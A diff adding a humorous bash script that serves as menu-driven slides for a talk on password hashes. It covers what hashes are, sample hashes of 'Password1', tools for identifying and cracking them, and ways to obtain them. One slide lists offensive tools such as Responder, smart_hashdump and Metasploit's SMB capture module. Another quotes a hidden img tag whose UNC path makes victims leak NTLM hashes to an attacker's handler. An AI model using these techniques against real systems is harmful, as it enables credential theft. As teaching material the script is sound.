@@ -1,0 +1,565 @@
+#!/bin/bash
+
+#Clear some variables
+unset x
+unset y
+
+#Save the starting location path
+location=$PWD
+clear
+
+##################################################
+#
+# MISCELLANEOUS FUNCTIONS
+# also, your mom
+#
+##################################################
+f_checkexit(){
+	if [ -z $clean ]; then
+		f_Quit
+	else
+		rm -rf /tmp/ec &> /dev/null
+		clear
+		exit 2> /dev/null
+	fi
+}
+
+f_Quit(){
+	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
+	sleep 3
+}
+
+f_isxrunning(){
+# Check to see if X is running
+if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
+	isxrunning=
+else
+	isxrunning=1
+fi
+
+# Uncomment the following line to launch in a screen session instead of an xterm window.
+#unset isxrunning
+
+if [ -z $isxrunning ]; then
+	echo -e "\n\e[1;31m[-] X Windows not detected, your compilers will be launched in screen\e[0m\n"
+	sleep 2
+fi
+}
+
+##################################################
+#
+# CRACKING THINGS FOR FUN AND PROFIT!!
+##################################################
+
+f_hashes(){
+clear
+f_Banner3
+
+echo "1.  what is a hash?"
+echo "2.  give me some examples?"
+echo "3.  seriously why did I do this in bash?"
+echo "4.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_whatisahash ;;
+	2) clean=; f_hashexamples ;;
+	3) clean=; f_ohgodwhy ;;	 
+	4) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+f_gettinghashes(){
+clear
+
+echo "1.  let other people get them"
+echo "2.  you get them"
+echo "3.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_someoneelsegetsthem ;;
+	2) clean=; f_yougetthem ;;
+	3) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+f_workingwithhashes(){
+clear
+echo "1.  determining type"
+echo "2.  cracking"
+echo "3.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_hashidentification ;;
+	2) clean=; f_hashcracking ;;
+	3) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+f_demo(){
+clear
+echo "1.  LET US TEMPT THE GODS"
+echo "2.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_spawnterm ;;
+	2) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+
+
+##################################################
+#
+# SUBMENU FUNCTIONS
+#
+##################################################
+
+f_spawnterm(){
+clear
+gnome-terminal
+sleep 2
+f_mainmenu
+}
+
+f_hashcracking(){
+clear
+echo -e "crack them!!"
+echo -e ""
+echo -e "rubber hose cryptanalysis"
+echo ""
+sleep 10
+echo -e "how do i computer?"
+sleep 3
+echo -e "GPU:"
+echo -e "-- Roughly stated, applications can be/have been written to utilize the parallel nature of cards that were optimized for graphics use"
+sleep 2
+echo -e "neckbeard sidenote: https://en.bitcoin.it/wiki/Why_a_GPU_mines_faster_than_a_CPU#Why_are_AMD_GPUs_faster_than_Nvidia_GPUs.3F"
+echo ""
+sleep 2
+echo -e "I use:"
+sleep 1
+echo -e "- John the Ripper"
+sleep 1
+echo -e "- oclHashCat"
+sleep 1
+echo -e "whitechapel (front end) - https://github.com/mubix/WhiteChapel"
+sleep 1
+echo -e ""
+	echo "1.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+
+	case $mainchoice in
+	1) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac
+}
+
+f_hashidentification(){
+	clear
+	echo -e "manual ID: "
+	echo -e "--- character sets and length"
+	echo -e "---- http://en.wikipedia.org/wiki/Cryptographic_hash_function#Cryptographic_hash_algorithms"
+	sleep 5
+	echo -e "automated ID: "
+	echo ""
+	sleep 2
+	echo -e "---- https://github.com/SmeegeSec/HashTag"
+	sleep 1
+	echo ""
+	echo -e "---- https://code.google.com/p/hash-identifier/"
+	sleep 1
+	echo ""
+	echo -e "---- jtr"
+	echo ""
+	sleep 2
+	echo "1.  Return to menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_hashes ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_hashes ;;
+	esac
+}	
+
+f_yougetthem(){
+clear
+echo ""
+echo "-- sqlmap.py -g"
+echo ""
+sleep 1
+echo "-- Compromised system?"
+sleep 1
+echo "--- metasploit: smart_hashdump"
+sleep 1
+echo "--- smbexec"
+sleep 1
+echo "--- pull from Volume Shadow Services"
+sleep 1
+echo ""
+echo "-- Network access?"
+sleep 1
+echo "-- Spiderlabs Responder.py"
+sleep 1
+echo "-- Metasploit SMB listener:"
+sleep 1
+echo -e "metasploit: use auxiliary/server/capture/smb"
+sleep 1
+echo -e "--- <img src=\\\\\\yourhandler\\img.jpg" style="display:none"\>""
+sleep 3
+echo -e "--- metasploit: use auxiliary/docx/word_unc_injector"
+sleep 1
+echo ""
+echo ""
+	echo "1.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	2) clean=; f_gettinghashes ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_gettinghashes ;;
+	esac
+
+
+
+}
+
+f_someoneelsegetsthem(){
+clear
+echo -e "-- https://twitter.com/dumpmon"
+sleep 1
+echo -e "--- http://raidersec.blogspot.com/2013/03/introducing-dumpmon-twitter-bot-that.html"
+sleep 1
+echo -e "--- https://github.com/jordan-wright/dumpmon"
+echo -e "e.g. - Dump Monitor ‏@dumpmon  4h http://pastebin.com/raw.php?i=00tr0XMT … Emails: 105 Keywords: 0.22 #infoleak"
+echo ""
+echo ""
+sleep 1
+	echo "1.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	2) clean=; f_gettinghashes ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_gettinghashes ;;
+	esac
+}
+
+f_defineudrink(){
+
+echo "A speaker announces that the µdrink protocol is in effect and specifies what drink will be used."
+echo "This should be a drink that is meaningful to them in some way."
+echo "The speaker shows the specific recipe for the drink, and then"
+echo "prepares a large quantity, preferably in a pitcher or other similar vessel."
+echo ""
+echo ""
+echo "blahblahblahblah drink"
+
+
+sleep 10
+f_ourdrink
+}
+
+f_ourdrink(){
+clear
+                                                                                               
+echo -e "		@@@       @@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@   @@@       @@@@@@@@  @@@@@@@@  @@@@@@@   "
+echo -e "		@@@       @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@       @@@@@@@@  @@@@@@@@  @@@@@@@@  "
+echo -e "		@@!       @@!  @@!  @@@  @@!       @@!  @@@  @@!  @@@  @@!       @@!       @@!       @@!  @@@  "
+echo -e "		!@!       !@!  !@!  @!@  !@!       !@!  @!@  !@   @!@  !@!       !@!       !@!       !@!  @!@  "
+echo -e "		@!!       !!@  @!@  !@!  @!!!:!    @!@!!@!   @!@!@!@   @!!       @!!!:!    @!!!:!    @!@  !@!  "
+echo -e "		!!!       !!!  !@!  !!!  !!!!!:    !!@!@!    !!!@!!!!  !!!       !!!!!:    !!!!!:    !@!  !!!  "
+echo -e "		!!:       !!:  :!:  !!:  !!:       !!: :!!   !!:  !!!  !!:       !!:       !!:       !!:  !!!  "
+echo -e "		:!:      :!:   ::!!:!   :!:       :!:  !:!  :!:  !:!   :!:      :!:       :!:       :!:  !:!   "
+echo -e "		:: ::::   ::    ::::     :: ::::  ::   :::   :: ::::   :: ::::   :: ::::   :: ::::   :::: ::   "
+echo -e "		: :: : :  :       :      : :: ::    :   : :  :: : ::   : :: : :  : :: ::   : :: ::   :: :  :   "
+echo -e ""
+echo -e ""
+echo ""
+echo " Liverbleed:"
+echo " 1 Part Sailor Jerry Rum"
+echo " 1 Part Woodchuck Cider"
+
+sleep 30
+f_udrink
+
+}
+
+f_ohgodwhy(){
+clear
+
+echo -e "  _____ ___  ____    _____ _   _ _____   _     ___  _     ____  "
+echo -e " |  ___/ _ \|  _ \  |_   _| | | | ____| | |   / _ \| |   / ___| "
+echo -e " | |_ | | | | |_) |   | | | |_| |  _|   | |  | | | | |   \___ \ "
+echo -e " |  _|| |_| |  _ <    | | |  _  | |___  | |__| |_| | |___ ___) |"
+echo -e " |_|   \___/|_| \_\   |_| |_| |_|_____| |_____\___/|_____|____/ "
+echo -e "                                                                "
+sleep 1
+f_mainmenu
+}
+
+f_whatisahash(){
+	clear
+	echo -e "A password “hash” is the result of a cryptographic function"
+	echo ""
+	sleep 2
+	echo -e "that takes an arbitrary string of data"
+	echo ""
+	sleep 2
+	echo -e "and returns a fixed-size string"
+	echo ""
+	sleep 2
+	echo "1.  Return to menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_hashes ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_hashes ;;
+	esac
+}
+
+
+f_hashexamples(){
+	clear
+	echo -e "md5 Password1: 		2ac9cb7dc02b3c0083eb70898e549b63"
+	echo ""
+	sleep 2
+	echo -e "SHA1 Password1: 		70ccd9007338d6d81dd3b6271621b9cf9a97ea00"
+	echo ""
+	sleep 2
+	echo -e "NTLM Password1:		64F12CDDAA88057E06A81B54E73B949B"
+	echo ""
+	sleep 2
+	echo "1.  Return to  menu"
+	echo
+	read -p "Choice: " mainchoice
+	case $mainchoice in
+	1) clean=; f_hashes ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_hashes ;;
+	esac
+}
+
+
+##################################################
+#
+# PREREQ FUNCTIONS
+#
+##################################################
+
+f_udrink(){
+clear
+f_Banner2
+
+	echo "1.  What is this uDrink you speak of?"
+	echo "2.  And what have you selected for us?"
+	echo "3.  Return to main menu"
+
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_defineudrink ;;
+	2) clean=; f_ourdrink ;;
+	3) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+f_whoami(){
+clear
+f_Banner3
+sleep 2
+	echo ""
+	echo "smrk3r"
+	echo ""
+	sleep 1
+	echo "i break into things"
+	echo ""
+	sleep 1
+	echo "2.  Return to main menu"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	2) clean=; f_mainmenu ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac	
+}
+
+
+##################################################
+#
+# MENU FUNCTIONS
+#
+##################################################
+
+f_Banner(){
+echo -e "##################################################################################################################"
+echo -e "		ÛÛÛÛÛÛÛÛÛÛÛ                                                                   ÛÛÛÛÛ								"
+echo -e "		°°ÛÛÛ°°°°°ÛÛÛ                                                                 °°ÛÛÛ 								"
+echo -e "		°ÛÛÛ    °ÛÛÛ  ÛÛÛÛÛÛ    ÛÛÛÛÛ   ÛÛÛÛÛ  ÛÛÛÛÛ ÛÛÛ ÛÛÛÛÛ  ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛ 								"
+echo -e "		°ÛÛÛÛÛÛÛÛÛÛ  °°°°°ÛÛÛ  ÛÛÛ°°   ÛÛÛ°°  °°ÛÛÛ °ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ°°ÛÛÛ°°ÛÛÛ ÛÛÛ°°ÛÛÛ 								"
+echo -e "		°ÛÛÛ°°°°°°    ÛÛÛÛÛÛÛ °°ÛÛÛÛÛ °°ÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °°° °ÛÛÛ °ÛÛÛ 								"
+echo -e "		°ÛÛÛ         ÛÛÛ°°ÛÛÛ  °°°°ÛÛÛ °°°°ÛÛÛ °°ÛÛÛÛÛÛÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ     °ÛÛÛ °ÛÛÛ 								"
+echo -e "		ÛÛÛÛÛ       °°ÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛ  ÛÛÛÛÛÛ   °°ÛÛÛÛ°ÛÛÛÛ   °°ÛÛÛÛÛÛ  ÛÛÛÛÛ    °°ÛÛÛÛÛÛÛÛ								"
+echo -e "		°°°°°         °°°°°°°° °°°°°°  °°°°°°     °°°° °°°°     °°°°°°  °°°°°      °°°°°°°° 								"
+echo -e "																															"
+echo -e "		                                       ÛÛÛÛÛ       ÛÛÛ                     										"
+echo -e "		                                      °°ÛÛÛ       °°°                      										"
+echo -e "		  ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ    ÛÛÛÛÛÛ  °ÛÛÛ ÛÛÛÛÛ ÛÛÛÛ  ÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛ										"
+echo -e "		ÛÛÛ°°ÛÛÛ°°ÛÛÛ°°ÛÛÛ °°°°°ÛÛÛ  ÛÛÛ°°ÛÛÛ °ÛÛÛ°°ÛÛÛ °°ÛÛÛ °°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ										"
+echo -e "		°ÛÛÛ °°°  °ÛÛÛ °°°   ÛÛÛÛÛÛÛ °ÛÛÛ °°°  °ÛÛÛÛÛÛ°   °ÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ										"
+echo -e "		°ÛÛÛ  ÛÛÛ °ÛÛÛ      ÛÛÛ°°ÛÛÛ °ÛÛÛ  ÛÛÛ °ÛÛÛ°°ÛÛÛ  °ÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ										"
+echo -e "		°°ÛÛÛÛÛÛ  ÛÛÛÛÛ    °°ÛÛÛÛÛÛÛÛ°°ÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛÛ ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛÛ										"
+echo -e "		°°°°°°  °°°°°      °°°°°°°°  °°°°°°  °°°° °°°°° °°°°° °°°° °°°°°  °°°°°ÛÛÛ										"
+echo -e "		                                                                   ÛÛÛ °ÛÛÛ										"
+echo -e "		                                                                  °°ÛÛÛÛÛÛ 										"
+echo -e "		                                                                   °°°°°°  										"
+echo -e "		                                                                   												"
+echo -e "		    ÛÛÛÛÛÛ                                                     ÛÛÛÛÛ 												"           
+echo -e "		   ÛÛÛ°°ÛÛÛ                                                   °°ÛÛÛ    											"         
+echo -e "		  °ÛÛÛ °°°   ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ     ÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   ÛÛÛÛÛÛ  °ÛÛÛÛÛÛÛ   ÛÛÛÛÛ 									"
+echo -e "		 ÛÛÛÛÛÛÛ    ÛÛÛ°°ÛÛÛ°°ÛÛÛ°°ÛÛÛ   °°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ ÛÛÛ°°ÛÛÛ °ÛÛÛ°°ÛÛÛ ÛÛÛ°°  									"
+echo -e "		°°°ÛÛÛ°    °ÛÛÛ °ÛÛÛ °ÛÛÛ °°°     °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ°ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ°°ÛÛÛÛÛ 									"
+echo -e "		  °ÛÛÛ     °ÛÛÛ °ÛÛÛ °ÛÛÛ         °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ°ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °°°°ÛÛÛ									"
+echo -e "		  ÛÛÛÛÛ    °°ÛÛÛÛÛÛ  ÛÛÛÛÛ        ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛ 									"
+echo -e "		 °°°°°      °°°°°°  °°°°°        °°°° °°°°°  °°°°°°   °°°°°°  °°°°°°°°  °°°°°°  									"                                                                             
+echo -e "##################################################################################################################"
+echo -e ""#THE BEER-WARE LICENSE" (Revision 34) - No Dennis Kuntz Open Source License:                                      "
+echo -e "#As long as you email funny stories to us, you                                                                   	"
+echo -e "#can do whatever you want with this stuff. Unless you are Dennis Kuntz.                                          	"
+echo -e "#Under no circumstances shall Dennis Kuntz be granted use of this software,                                      	"
+echo -e "#source code, documentation, or other related material.                                                           	"
+echo -e "#Persons dealing in the Software agree not to knowingly distribute these materials                               	"
+echo -e "#or any derivative works to Dennis Kuntz. *                                                                      	"
+echo -e "##################################################################################################################"
+}
+
+f_Banner2(){
+	echo  ""                                              
+	echo  "		 ___________ _______ _______ _______ _______ ___ 		"
+	echo  "		|\     /|\     /|\     /|\     /|\     /|\     /|		"
+	echo  "		| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |		"
+	echo  "		| |   | | |   | | |   | | |   | | |   | | |   | |		"
+	echo  "		| |u  | | |D  | | |r  | | |i  | | |n  | | |k  | |		"
+	echo  "		| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |		"
+	echo  "		|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|		"                                                    
+	echo  ""
+}
+
+f_Banner3(){
+	echo -e "#############################################################################################################"
+echo -e "		________________  .____    ___________                                                                          "
+echo -e "		\_   _____/  _  \ |    |   \_   _____/                                                                          "
+echo -e "		 |    __)/  /_\  \|    |    |    __)_                                                                           "
+echo -e "		 |     \/    |    |    |___ |        \                                                                          "
+echo -e "		 \___  /\____|__  |_______ /_______  /                                                                          "
+echo -e "		   _____        \/        \/       \/.__        __  .__                        _____                            "
+echo -e "		  /  _  \   ______ __________   ____ |_______ _/  |_|__| ____   ____     _____/ ____\                           "
+echo -e "		 /  /_\  \ /  ___//  ___/  _ \_/ ___\|  \__  \\   __|  |/  _ \ /    \   /  _ \    __\                           "
+echo -e "		/    |    \\___ \ \___ (  <_> \  \___|  |/ __ \|  | |  (  <_> |   |  \ (  <_>  |  |                             "
+echo -e "		\____|__  /____  /____  \____/ \___  |__(____  |__| |__|\____/|___|  /  \____/|__|                              "
+echo -e "		.____   \/     \/     \__          \/        \/          ___                                                    "
+echo -e "		|    |    ____   ____ |  | __ ___________   ____________/   \                                                   "
+echo -e "		|    |   /  _ \_/ ___\|  |/ //  ___\____ \ /  _ \_  __ \   __\                                                  "
+echo -e "		|    |__(  <_> \  \___|    < \___ \|  |_> (  <_> |  | \/|  |                                                    "
+echo -e "		|_______ \____/ \___  |__|_ /____  |   __/ \____/|__|   |__|                                                    "
+echo -e "		___________       __\/.__  \/    \/|__|  .__                _                                                   "
+echo -e "		\_   _____/ _____/  |_|  |__  __ __ _____|_______    ______/  |_ _____                                          "
+echo -e "		 |    __)_ /    \   __|  |  \|  |  /  ___|  \__  \  /  ___\   __/  ___/                                         "
+echo -e "		 |        |   |  |  | |   Y  |  |  \___ \|  |/ __ \_\___ \ |  | \___ \                                          "
+echo -e "		/_______  |___|  |__| |___|  |____/____  |__(____  /____  >|__|/____  >                                         "
+echo -e "		       \/     \/          \/          \/        \/     \/          \/                                           "
+echo -e "		                                                                                                                "
+	echo -e "#############################################################################################################"
+}
+
+##################################################
+
+##################################################
+f_prereqs(){
+	clear
+	echo "1.  uDrink"
+	echo "2.  whoami"
+	echo "3.  Previous Menu"
+	echo
+	read -p "Choice: " prereqschoice
+
+	case $prereqschoice in
+	1) f_udrink ;;
+	2) f_whoami ;;
+	3) f_mainmenu ;;
+	*) f_prereqs ;;
+	esac
+}
+
+##################################################
+f_mainmenu(){
+	clear
+	f_Banner
+
+	echo "1.  Prerequisites"
+	echo "2.  Hashes"
+	echo "3.  How to get them"
+	echo "4.  What do do with them"
+	echo "5.  COME AT ME DEMO GODS"
+	echo "6.  Quit this ridiculous presentation"
+	echo
+	read -p "Choice: " mainchoice
+
+	case $mainchoice in
+	1) clean=; f_prereqs ;;
+	2) clean=; f_hashes ;;
+	3) clean=; f_gettinghashes ;;
+	4) clean=; f_workingwithhashes ;;
+	5) clean=; f_demo ;;
+	6) f_checkexit ;;
+	1968) f_pbs ;;
+	Q|q) f_Quit ;;
+	*) f_mainmenu ;;
+	esac
+}
+
+
+f_isxrunning
+clean=1
+f_mainmenu
